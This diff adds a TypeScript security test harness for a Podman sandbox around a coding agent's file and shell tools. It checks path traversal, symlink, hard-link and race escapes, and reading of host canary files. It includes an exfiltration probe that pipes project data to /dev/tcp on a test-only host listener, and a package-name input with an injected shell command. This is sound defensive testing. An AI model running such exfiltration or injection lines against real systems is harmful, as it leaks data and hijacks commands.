@@ -1,0 +1,504 @@
+import fs from "node:fs/promises";
+import net from "node:net";
+import path from "node:path";
+import type { ExtensionAPI } from "@earendil-works/pi-coding-agent";
+import sandboxExtension from "../podman-sandbox.ts";
+
+// This adapter captures the exact AgentTool instances registered by production
+// code. A scripted test command can invoke those callbacks without a provider,
+// while still exercising the same host guards and Podman operation closures.
+const tools = new Map<string, any>();
+// Lifecycle events are forwarded so the tested extension performs real startup
+// image validation/build and its normal container cleanup on RPC shutdown.
+const innerEvents = new Map<string, Function[]>();
+
+function assert(condition: unknown, message: string): asserts condition {
+  if (!condition) throw new Error(message);
+}
+
+function quote(value: string): string {
+  return `'${value.replaceAll("'", "'\\''")}'`;
+}
+
+function isInside(root: string, candidate: string): boolean {
+  const relative = path.relative(root, candidate);
+  return relative === "" || (relative !== ".." && !relative.startsWith(`..${path.sep}`) && !path.isAbsolute(relative));
+}
+
+async function tool(name: string, input: unknown, cwd = process.cwd()): Promise<any> {
+  const selected = tools.get(name);
+  assert(selected, `sandbox tool not registered: ${name}`);
+  return selected.execute(`security-${name}`, input, undefined, undefined, { cwd });
+}
+
+async function expectDenied(name: string, input: unknown, outsidePath: string, cwd = process.cwd()) {
+  // Different Pi tools can reject before reaching their operation callback;
+  // either outcome is safe if it prevents external content from being returned.
+  try {
+    const result = await tool(name, input, cwd);
+    const rendered = JSON.stringify(result);
+    const canary = process.env.PI_SANDBOX_HOST_CANARY;
+    if (canary) assert(!rendered.includes(canary), `${name} returned the host canary`);
+  } catch (error) {
+    const message = error instanceof Error ? error.message : String(error);
+    const canary = process.env.PI_SANDBOX_HOST_CANARY;
+    if (canary) assert(!message.includes(canary), `${name} error exposed the host canary`);
+    assert(
+      message.includes("path escapes project directory") || message.startsWith("Path not found:"),
+      `${name} failed for the wrong reason: ${message}`,
+    );
+    return;
+  }
+  throw new Error(`${name} unexpectedly accepted outside-project path ${outsidePath}`);
+}
+
+async function snapshot(file: string) {
+  const [content, stat] = await Promise.all([fs.readFile(file), fs.stat(file, { bigint: true })]);
+  return {
+    content: content.toString("base64"),
+    dev: stat.dev.toString(),
+    ino: stat.ino.toString(),
+    mode: stat.mode.toString(),
+    nlink: stat.nlink.toString(),
+    uid: stat.uid.toString(),
+    gid: stat.gid.toString(),
+    size: stat.size.toString(),
+    mtimeNs: stat.mtimeNs.toString(),
+  };
+}
+
+async function unchanged(file: string, before: Awaited<ReturnType<typeof snapshot>>, label: string) {
+  assert(JSON.stringify(await snapshot(file)) === JSON.stringify(before), `${label} changed an outside host file`);
+}
+
+async function expectDeniedAndUnchanged(
+  name: string,
+  input: unknown,
+  outsidePath: string,
+  file: string,
+  before: Awaited<ReturnType<typeof snapshot>>,
+  label: string,
+) {
+  let failure: unknown;
+  try {
+    await expectDenied(name, input, outsidePath);
+  } catch (error) {
+    failure = error;
+  }
+  await unchanged(file, before, label);
+  if (failure) throw failure;
+}
+
+function skipped(reason: string): Error {
+  return Object.assign(new Error(reason), { securityTestSkipped: true });
+}
+
+async function bash(command: string, cwd = process.cwd(), timeout = 20) {
+  const result = await tool("bash", { command, timeout }, cwd);
+  return result.structuredContent as { output: string; exit_code: number };
+}
+
+export default function (pi: ExtensionAPI) {
+  // Only the lifecycle and registrations needed by production are bridged. The
+  // inner maintenance command is intentionally not exposed by the test shim.
+  const bridge = {
+    registerFlag: (name: string, options: any) => pi.registerFlag(name as any, options),
+    getFlag: (name: string) => pi.getFlag(name as any),
+    registerTool: (definition: any) => {
+      tools.set(definition.name, definition);
+      // Registering the same definitions in this Pi session lets the harness
+      // verify real active/hidden exposure rather than metadata in isolation.
+      pi.registerTool(definition);
+    },
+    registerCommand: () => undefined,
+    on: (event: string, handler: Function) => {
+      const handlers = innerEvents.get(event) ?? [];
+      handlers.push(handler);
+      innerEvents.set(event, handlers);
+    },
+  };
+  sandboxExtension(bridge as unknown as ExtensionAPI);
+
+  pi.on("session_start", async (event, ctx) => {
+    for (const handler of innerEvents.get("session_start") ?? []) await handler(event, ctx);
+  });
+  pi.on("session_shutdown", async () => {
+    for (const handler of innerEvents.get("session_shutdown") ?? []) await handler();
+  });
+
+  pi.registerCommand("sandbox-security-test", {
+    description: "Run security-boundary tests for the Podman sandbox tools",
+    handler: async (_args, ctx) => {
+      // Every check records its own result so one failure does not hide evidence
+      // from the remaining independent boundary tests.
+      const results: { name: string; passed: boolean; skipped?: boolean; detail?: string }[] = [];
+      let outsideDir = "";
+      let outsideTmpDir = "";
+      let outsideFile = "";
+      const hostCanary = process.env.PI_SANDBOX_HOST_CANARY;
+      const fixtureId = process.env.PI_SANDBOX_FIXTURE_ID;
+      assert(hostCanary && /^[a-f0-9]{32}$/.test(hostCanary), "host-canary token was not provided by the RPC harness");
+      assert(fixtureId && /^[a-f0-9]{16}$/.test(fixtureId), "fixture identifier was not provided by the RPC harness");
+      const insideDir = path.join(process.cwd(), `security-test-${process.pid}-${fixtureId}`);
+      // The host-only fixture is a sibling of the project, outside the bind mount
+      // and on the same filesystem for the hard-link probe where supported.
+      const insideFile = path.join(insideDir, "written-by-sandbox.txt");
+      const manyMatchesFile = path.join(insideDir, "many-matches.txt");
+      const symlinkPath = path.join(insideDir, "outside-link.txt");
+      const parentSymlinkPath = path.join(insideDir, "outside-parent");
+      const sentinel = `HOST_SECRET_${hostCanary}`;
+      const projectMarker = `sandbox-write-${process.pid}`;
+      const record = async (name: string, test: () => Promise<void | string>) => {
+        try {
+          const detail = await test();
+          results.push({ name, passed: true, ...(typeof detail === "string" ? { detail } : {}) });
+        } catch (error) {
+          const isSkipped = Boolean((error as any)?.securityTestSkipped);
+          results.push({
+            name,
+            passed: false,
+            ...(isSkipped ? { skipped: true } : {}),
+            detail: error instanceof Error ? error.message : String(error),
+          });
+        }
+        if (process.env.PI_SANDBOX_SECURITY_VERBOSE === "1") {
+          const result = results[results.length - 1];
+          const marker = result.skipped ? "SKIP" : result.passed ? "PASS" : "FAIL";
+          const detail = result.detail ? `: ${result.detail}` : "";
+          ctx.ui.notify(`SECURITY_TEST_PROGRESS:${marker}:${name}${detail}`, result.passed ? "info" : "warning");
+        }
+      };
+
+      try {
+        outsideDir = process.env.PI_SANDBOX_SECURITY_OUTSIDE ?? "";
+        outsideTmpDir = process.env.PI_SANDBOX_SECURITY_TMP ?? "";
+        assert(outsideDir && outsideTmpDir, "RPC harness did not provide disposable host fixture directories");
+        assert(!isInside(process.cwd(), outsideDir) && !isInside(process.cwd(), outsideTmpDir), "host fixtures must be outside the project");
+        await fs.mkdir(outsideDir);
+        await fs.mkdir(outsideTmpDir);
+        outsideFile = path.join(outsideDir, "host-only-secret.txt");
+        const tmpSecretFile = path.join(outsideTmpDir, "tmp-host-secret.txt");
+        const outsideWriteFile = path.join(outsideDir, "write-target.txt");
+        const outsideHardlinkFile = path.join(outsideDir, "hardlink-target.txt");
+        const outsideBashHardlinkFile = path.join(outsideDir, "bash-hardlink-target.txt");
+        const outsideSecretDir = path.join(outsideDir, "secret-directory");
+        await fs.mkdir(outsideSecretDir);
+        await fs.writeFile(outsideFile, sentinel, { mode: 0o600 });
+        await fs.writeFile(tmpSecretFile, sentinel, { mode: 0o600 });
+        await fs.writeFile(outsideWriteFile, "outside-original", { mode: 0o600 });
+        await fs.writeFile(outsideHardlinkFile, sentinel, { mode: 0o600 });
+        await fs.writeFile(outsideBashHardlinkFile, sentinel, { mode: 0o600 });
+        await fs.mkdir(insideDir, { recursive: true });
+        await fs.symlink(outsideFile, symlinkPath);
+        await fs.symlink(outsideDir, parentSymlinkPath);
+        const outsideSnapshot = await snapshot(outsideFile);
+        const tmpSnapshot = await snapshot(tmpSecretFile);
+        const writeSnapshot = await snapshot(outsideWriteFile);
+        const hardlinkSnapshot = await snapshot(outsideHardlinkFile);
+        const bashHardlinkSnapshot = await snapshot(outsideBashHardlinkFile);
+
+        // Direct, relative-traversal, and symlink paths all target the same
+        // unique host canary so accidental disclosure is detectable.
+        await record("read rejects an absolute path outside the project without leaking contents", async () => {
+          await expectDenied("read", { path: outsideFile }, outsideFile);
+        });
+        await record("read rejects relative traversal outside the project", async () => {
+          const traversal = path.relative(process.cwd(), outsideFile);
+          await expectDenied("read", { path: traversal }, traversal);
+        });
+        await record("write rejects an absolute outside path without modifying the host file", async () => {
+          await expectDeniedAndUnchanged("write", { path: outsideWriteFile, content: "overwrite-attempt" }, outsideWriteFile, outsideWriteFile, writeSnapshot, "absolute write");
+        });
+        await record("write rejects relative traversal without modifying the host file", async () => {
+          const traversal = path.relative(process.cwd(), outsideWriteFile);
+          await expectDeniedAndUnchanged("write", { path: traversal, content: "overwrite-attempt" }, traversal, outsideWriteFile, writeSnapshot, "traversal write");
+        });
+        await record("edit rejects an absolute outside path without modifying the host file", async () => {
+          await expectDeniedAndUnchanged("edit", { path: outsideWriteFile, edits: [{ oldText: "outside-original", newText: "overwrite-attempt" }] }, outsideWriteFile, outsideWriteFile, writeSnapshot, "absolute edit");
+        });
+        await record("read rejects a host file under the system temporary directory without leaking contents", async () => {
+          await expectDenied("read", { path: tmpSecretFile }, tmpSecretFile);
+        });
+        await record("write rejects a host file under the system temporary directory without modifying it", async () => {
+          await expectDeniedAndUnchanged("write", { path: tmpSecretFile, content: "tmp-overwrite" }, tmpSecretFile, tmpSecretFile, tmpSnapshot, "temporary-directory write");
+        });
+        await record("write rejects a new file outside the project via relative traversal", async () => {
+          const target = path.relative(process.cwd(), path.join(outsideDir, "new-traversal-target.txt"));
+          let failure: unknown;
+          try {
+            await expectDenied("write", { path: target, content: "outside-create-attempt" }, target);
+          } catch (error) {
+            failure = error;
+          }
+          const created = await fs.stat(path.join(outsideDir, "new-traversal-target.txt")).then(() => true, () => false);
+          assert(!created, "write created a host file through relative traversal");
+          if (failure) throw failure;
+        });
+        await record("write rejects a missing child beneath an outside-pointing parent symlink", async () => {
+          const target = path.join(parentSymlinkPath, "new-child.txt");
+          let failure: unknown;
+          try {
+            await expectDenied("write", { path: target, content: "outside-create-attempt" }, target);
+          } catch (error) {
+            failure = error;
+          }
+          const created = await fs.stat(path.join(outsideDir, "new-child.txt")).then(() => true, () => false);
+          assert(!created, "write created a host file through parent symlink");
+          if (failure) throw failure;
+        });
+        await record("read rejects a symlink escaping the project", async () => {
+          await expectDenied("read", { path: symlinkPath }, symlinkPath);
+        });
+        await record("write rejects a symlink escaping the project without modifying the target", async () => {
+          await expectDeniedAndUnchanged("write", { path: symlinkPath, content: "overwrite-attempt" }, symlinkPath, outsideFile, outsideSnapshot, "symlink write");
+        });
+        await record("edit rejects a symlink escaping the project without modifying the target", async () => {
+          await expectDeniedAndUnchanged("edit", { path: symlinkPath, edits: [{ oldText: sentinel, newText: "overwrite-attempt" }] }, symlinkPath, outsideFile, outsideSnapshot, "symlink edit");
+        });
+        await record("ls rejects a project symlink to an outside directory", async () => {
+          await expectDenied("ls", { path: parentSymlinkPath }, parentSymlinkPath);
+        });
+        await record("hidden legacy grep callback rejects outside roots", async () => {
+          await expectDenied("grep", { pattern: hostCanary, path: outsideDir, literal: true }, outsideDir);
+        });
+        await record("hidden legacy grep callback rejects a symlink to an outside root", async () => {
+          await expectDenied("grep", { pattern: hostCanary, path: parentSymlinkPath, literal: true }, parentSymlinkPath);
+        });
+        await record("read rejects a project hard link to an outside host file", async () => {
+          const alias = path.join(insideDir, "hardlink-read.txt");
+          try {
+            await fs.link(outsideHardlinkFile, alias);
+          } catch (error: any) {
+            if (["EPERM", "EOPNOTSUPP", "EXDEV"].includes(error?.code)) throw skipped(`hard links unavailable: ${error.code}`);
+            throw error;
+          }
+          await expectDenied("read", { path: alias }, alias);
+        });
+        await record("write rejects a project hard link without modifying its outside inode", async () => {
+          const alias = path.join(insideDir, "hardlink-write.txt");
+          try {
+            await fs.link(outsideHardlinkFile, alias);
+          } catch (error: any) {
+            if (["EPERM", "EOPNOTSUPP", "EXDEV"].includes(error?.code)) throw skipped(`hard links unavailable: ${error.code}`);
+            throw error;
+          }
+          await expectDeniedAndUnchanged("write", { path: alias, content: "hardlink-overwrite" }, alias, outsideHardlinkFile, hardlinkSnapshot, "hard-link write");
+        });
+        await record("path-validation race cannot redirect a write outside the project", async () => {
+          const raceParent = path.join(insideDir, "race-parent");
+          const movedParent = `${raceParent}-moved`;
+          const raceTarget = path.join(raceParent, "payload.txt");
+          const escapedTarget = path.join(outsideDir, "race-payload.txt");
+          await fs.mkdir(raceParent);
+          const originalWriteFile = fs.writeFile;
+          let swapped = false;
+          (fs as any).writeFile = async (file: any, ...args: any[]) => {
+            if (typeof file === "string" && path.resolve(file) === path.resolve(raceTarget) && !swapped) {
+              swapped = true;
+              await fs.rename(raceParent, movedParent);
+              await fs.symlink(outsideDir, raceParent);
+            }
+            return Reflect.apply(originalWriteFile, fs, [file, ...args]);
+          };
+          let failure: unknown;
+          try {
+            await expectDenied("write", { path: raceTarget, content: "race-overwrite" }, raceTarget);
+          } catch (error) {
+            failure = error;
+          } finally {
+            (fs as any).writeFile = originalWriteFile;
+          }
+          assert(swapped, "race hook did not run between validation and write");
+          const escaped = await fs.stat(escapedTarget).then(() => true, () => false);
+          assert(!escaped, "path-validation race created a file outside the project");
+          if (failure) throw failure;
+        });
+        await record("native search is available and legacy grep is hidden", async () => {
+          const search = tools.get("search");
+          const grep = tools.get("grep");
+          assert(search && grep, "search and legacy grep definitions were not registered");
+          assert(grep.exposure === "hidden", `legacy grep exposure is ${grep.exposure ?? "default"}`);
+          const activeTools = pi.getActiveTools();
+          assert(activeTools.includes("search"), "native search is not active for the model");
+          assert(!activeTools.includes("grep"), "legacy grep remains model-visible");
+          assert(search.description.includes("grep/rg") && search.promptGuidelines.some((line: string) => line.includes("instead of")), "search guidance does not discourage shell grep/rg");
+        });
+        await record("search rejects an outside-project root", async () => {
+          await expectDenied("search", { query: sentinel, path: outsideDir }, outsideDir);
+        });
+        await record("search rejects a project symlink to an outside root", async () => {
+          await expectDenied("search", { query: sentinel, path: parentSymlinkPath }, parentSymlinkPath);
+        });
+        await record("find rejects an outside-project search root", async () => {
+          await expectDenied("find", { pattern: "*", path: outsideDir }, outsideDir);
+        });
+        await record("find rejects a project symlink to an outside root", async () => {
+          await expectDenied("find", { pattern: "*", path: parentSymlinkPath }, parentSymlinkPath);
+        });
+        // A rejected cwd proves commands cannot change their execution root to
+        // a host directory even though command text itself is user-controlled.
+        await record("bash rejects an outside-project working directory", async () => {
+          try {
+            await bash("pwd", outsideDir);
+          } catch {
+            return;
+          }
+          throw new Error("bash accepted an outside-project working directory");
+        });
+        await record("bash rejects a project symlink as its working directory", async () => {
+          try {
+            await bash("pwd", parentSymlinkPath);
+          } catch {
+            return;
+          }
+          throw new Error("bash accepted a symlink to an outside working directory");
+        });
+        // Namespace identity and an unmounted sentinel test the host boundary;
+        // file ownership confirms that legitimate project edits still persist.
+        // A real command invocation guards against regressions where container
+        // startup appears ready but the model-facing bash operation still fails.
+        await record("bash tool executes a simple date command", async () => {
+          const result = await bash("date -u +%Y-%m-%d");
+          assert(result.exit_code === 0 && /^\d{4}-\d{2}-\d{2}$/.test(result.output.trim()), `date failed: ${result.output}`);
+        });
+        await record("container runs as the mapped non-root agent user", async () => {
+          const result = await bash("printf '%s:%s' \"$(id -u)\" \"$(id -g)\"");
+          assert(result.exit_code === 0, `id failed: ${result.output}`);
+          assert(result.output.trim() === `${process.getuid?.() ?? 1000}:${process.getgid?.() ?? 1000}`, `unexpected container identity: ${result.output.trim()}`);
+        });
+        await record("container cannot read an unmounted host sentinel", async () => {
+          const result = await bash(`if test -r ${quote(outsideFile)}; then cat ${quote(outsideFile)}; exit 41; else echo isolated; fi`);
+          assert(result.exit_code === 0 && result.output.trim() === "isolated", "container could access an unmounted host canary");
+        });
+        await record("container cannot read a host canary under /tmp", async () => {
+          const result = await bash(`if test -r ${quote(tmpSecretFile)}; then cat ${quote(tmpSecretFile)}; exit 41; else echo isolated; fi`);
+          assert(result.exit_code === 0 && result.output.trim() === "isolated", "container could access the host /tmp canary");
+        });
+        await record("container cannot follow a project symlink to an outside host file", async () => {
+          const result = await bash(`cat ${quote(symlinkPath)}`);
+          assert(result.exit_code !== 0, "container followed the project symlink to a host file");
+          assert(!result.output.includes(hostCanary), "container returned the outside host canary through a symlink");
+          await unchanged(outsideFile, outsideSnapshot, "container symlink access");
+        });
+        await record("container cannot modify a host file through a project symlink", async () => {
+          const result = await bash(`printf symlink-overwrite > ${quote(symlinkPath)}`);
+          assert(result.exit_code !== 0, "container modified a host file through a project symlink");
+          await unchanged(outsideFile, outsideSnapshot, "container symlink write");
+        });
+        await record("container cannot read a hard-linked outside host file", async () => {
+          const alias = path.join(insideDir, "bash-hardlink-read.txt");
+          try {
+            await fs.link(outsideBashHardlinkFile, alias);
+          } catch (error: any) {
+            if (["EPERM", "EOPNOTSUPP", "EXDEV"].includes(error?.code)) throw skipped(`hard links unavailable: ${error.code}`);
+            throw error;
+          }
+          const result = await bash(`cat ${quote(alias)}`);
+          assert(!result.output.includes(hostCanary), "container disclosed the outside host canary through a hard link");
+        });
+        await record("container cannot modify an outside host file through a project hard link", async () => {
+          const alias = path.join(insideDir, "bash-hardlink-write.txt");
+          try {
+            await fs.link(outsideBashHardlinkFile, alias);
+          } catch (error: any) {
+            if (["EPERM", "EOPNOTSUPP", "EXDEV"].includes(error?.code)) throw skipped(`hard links unavailable: ${error.code}`);
+            throw error;
+          }
+          const result = await bash(`printf hardlink-overwrite > ${quote(alias)}`);
+          assert(result.exit_code === 0, `hard-link write probe did not execute: ${result.output}`);
+          await unchanged(outsideBashHardlinkFile, bashHardlinkSnapshot, "container hard-link write");
+        });
+        await record("container writes project files with host-agent ownership", async () => {
+          const result = await bash(`printf ${quote(projectMarker)} > ${quote(insideFile)} && stat -c '%u:%g' ${quote(insideFile)}`);
+          assert(result.exit_code === 0, `project write failed: ${result.output}`);
+          assert((await fs.readFile(insideFile, "utf8")) === projectMarker, "project write not visible on host");
+          const stat = await fs.stat(insideFile);
+          assert(stat.uid === (process.getuid?.() ?? 1000) && stat.gid === (process.getgid?.() ?? 1000), `wrong host ownership: ${stat.uid}:${stat.gid}`);
+        });
+        await record("network egress audit reports whether mounted project data can reach a controlled host sink", async () => {
+          const server = net.createServer();
+          const chunks: Buffer[] = [];
+          const received = new Promise<string>((resolve) => {
+            server.once("connection", (socket) => {
+              socket.on("data", (chunk: Buffer) => chunks.push(chunk));
+              socket.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));
+            });
+          });
+          try {
+            await new Promise<void>((resolve, reject) => {
+              server.once("error", reject);
+              server.listen(0, "0.0.0.0", () => {
+                server.off("error", reject);
+                resolve();
+              });
+            });
+            const address = server.address();
+            assert(address && typeof address !== "string", "test receiver did not bind a TCP port");
+            let result: { output: string; exit_code: number };
+            try {
+              result = await bash(`cat ${quote(insideFile)} | bash -c 'cat > /dev/tcp/host.containers.internal/${address.port}'`, process.cwd(), 8);
+            } catch {
+              throw skipped("container could not reach the controlled host receiver");
+            }
+            if (result.exit_code !== 0) throw skipped("container egress to the controlled host receiver is blocked or unavailable");
+            const payload = await Promise.race([
+              received,
+              new Promise<null>((resolve) => setTimeout(() => resolve(null), 3000)),
+            ]);
+            if (payload === null) throw skipped("controlled receiver did not receive the test payload");
+            assert(payload === projectMarker, "controlled receiver got unexpected bytes");
+            return "network egress is enabled by documented policy; mounted project data reached the test-only sink";
+          } finally {
+            await new Promise<void>((resolve) => server.close(() => resolve()));
+          }
+        });
+        // Structured matches let callers consume results without reparsing prose.
+        await record("search returns structured project matches", async () => {
+          const searchPath = path.relative(process.cwd(), insideDir);
+          const result = await tool("search", { query: projectMarker, path: searchPath, literal: true, limit: 10 });
+          const matches = result.structuredContent.matches as { path: string; line: number; text: string }[];
+          assert(!result.structuredContent.truncated, "small fixture search unexpectedly truncated");
+          assert(matches.some((match) => match.text.includes(projectMarker) && match.path.endsWith("written-by-sandbox.txt")), `native search omitted the project fixture: ${JSON.stringify(result.structuredContent)} / ${JSON.stringify(result.content)}`);
+        });
+        await record("search result count is bounded for model context", async () => {
+          await fs.writeFile(manyMatchesFile, "repeat\nrepeat\nrepeat\n");
+          const searchPath = path.relative(process.cwd(), insideDir);
+          const result = await tool("search", { query: "repeat", path: searchPath, literal: true, limit: 1 });
+          assert(result.structuredContent.matches.length === 1, "search exceeded the requested match limit");
+          assert(result.structuredContent.truncated, "search did not report omitted matches");
+        });
+        // The added APT capabilities caused a real leak in an earlier run.
+        // Checking CapEff and dpkg permissions guards against that regression.
+        await record("ordinary sandbox commands have no effective capabilities or dpkg write access", async () => {
+          const result = await bash("cap=$(awk '/^CapEff:/{print $2}' /proc/self/status); test \"$cap\" = 0000000000000000 && test ! -w /var/lib/dpkg/status && printf '%s' \"$cap\"");
+          assert(result.exit_code === 0, `ordinary command retained capabilities or dpkg access: ${result.output}`);
+        });
+        await record("package tool rejects shell syntax before execution", async () => {
+          try {
+            await tool("sandbox", { pkg_add: `coreutils; touch ${outsideFile}` });
+          } catch (error) {
+            const message = error instanceof Error ? error.message : String(error);
+            assert(message.includes("pkg_add accepts Debian package names only"), `package tool rejected input for the wrong reason: ${message}`);
+            assert((await fs.readFile(outsideFile, "utf8")) === sentinel, "host sentinel changed by package-name injection");
+            return;
+          }
+          throw new Error("package tool accepted shell syntax");
+        });
+      } finally {
+        // Test fixtures are host-side resources and must not survive successful
+        // runs or failed assertions.
+        if (insideDir) await fs.rm(insideDir, { recursive: true, force: true });
+        if (outsideTmpDir) await fs.rm(outsideTmpDir, { recursive: true, force: true });
+        if (outsideDir) await fs.rm(outsideDir, { recursive: true, force: true });
+      }
+
+      const passed = results.filter((item) => item.passed).length;
+      const skippedCount = results.filter((item) => item.skipped).length;
+      const failed = results.length - passed - skippedCount;
+      // One machine-readable notification lets the RPC harness report all test
+      // evidence and return nonzero if any boundary check failed.
+      const summary = { passed, failed, skipped: skippedCount, total: results.length, results };
+      ctx.ui.notify(`SECURITY_TEST_RESULTS:${JSON.stringify(summary)}`, failed === 0 ? "info" : "error");
+    },
+  });
+}
